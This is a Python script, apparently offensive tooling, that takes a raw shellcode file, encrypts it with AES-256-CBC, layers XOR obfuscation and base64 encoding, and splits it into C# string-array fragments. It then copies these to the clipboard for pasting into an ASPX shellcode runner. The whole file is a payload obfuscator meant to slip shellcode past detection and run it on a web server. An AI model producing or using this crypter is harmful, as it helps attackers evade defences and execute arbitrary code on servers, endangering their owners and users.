import base64
import secrets
import pyperclip
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Configuration
shellcode_file = "shellcode.bin"
xor_key = 0x5A
chunk_size_key_iv = 44    # Chunk size for Key and IV fragments (fit in one chunk)
chunk_size_payload = 60   # Chunk size for payload fragments

def generate_random_key_iv():
    key = secrets.token_bytes(32)  # AES-256 Key
    iv = secrets.token_bytes(16)   # AES-128 IV
    return key, iv

def encrypt_aes(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted

def xor_encrypt(data, key_byte):
    return bytes(b ^ key_byte for b in data)

def fragment_string(b64data, size):
    text = b64data.decode()
    return [text[i:i+size] for i in range(0, len(text), size)]

def format_fragments(variable_name, fragments):
    formatted = ', '.join([f'"{frag}"' for frag in fragments])
    return f'string[] {variable_name} = {{ {formatted} }};'

def main():
    # Read shellcode.bin
    with open(shellcode_file, "rb") as f:
        shellcode = f.read()

    # Encrypt shellcode with AES-256-CBC
    aes_key, aes_iv = generate_random_key_iv()
    encrypted_shellcode = encrypt_aes(shellcode, aes_key, aes_iv)

    # Additional XOR obfuscation
    xor_encrypted = xor_encrypt(encrypted_shellcode, xor_key)

    # Base64 encoding
    key_b64 = base64.b64encode(aes_key)
    iv_b64 = base64.b64encode(aes_iv)
    shellcode_b64 = base64.b64encode(xor_encrypted)

    # Fragment into small chunks
    key_fragments = fragment_string(key_b64, chunk_size_key_iv)
    iv_fragments = fragment_string(iv_b64, chunk_size_key_iv)
    shellcode_fragments = fragment_string(shellcode_b64, chunk_size_payload)

    # Prepare ASPX output
    output = ""
    output += format_fragments("x1", key_fragments) + "\n"
    output += format_fragments("x2", iv_fragments) + "\n"
    output += format_fragments("x3", shellcode_fragments) + "\n"
    output += f'byte xorKey = 0x{xor_key:02X};'

    # Copy to clipboard
    pyperclip.copy(output)

    print("\n[+] Done! The ASPX fragment is now copied to your clipboard.")
    print("[+] Paste it into the ASPX_Shellcode_Runner.aspx file.")

if __name__ == "__main__":
    main()
